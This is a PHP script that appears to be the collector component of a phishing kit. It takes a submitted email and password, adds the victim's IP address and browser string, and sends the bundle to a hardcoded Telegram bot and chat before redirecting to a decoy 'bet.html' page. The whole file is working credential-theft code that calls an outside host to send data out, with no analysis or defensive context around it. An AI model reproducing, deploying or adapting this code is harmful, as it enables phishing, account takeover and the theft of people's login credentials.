<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "-------DKK----------\n";
$message .= "Email : ".$_POST['zz']."\n";
$message .= "Pass : ".$_POST['aa']."\n";
$message .= "----------- IP Infos -------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------DKK---------------------\n";
$token = "7162470911:AAFMotHxm71yTYdJwPZoD0WQQnqPQy2QYCk";
$data = [
    'text' => $message,
    'chat_id' => '-4529595568'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

 

header("Location: ../bet.html");?>

<?php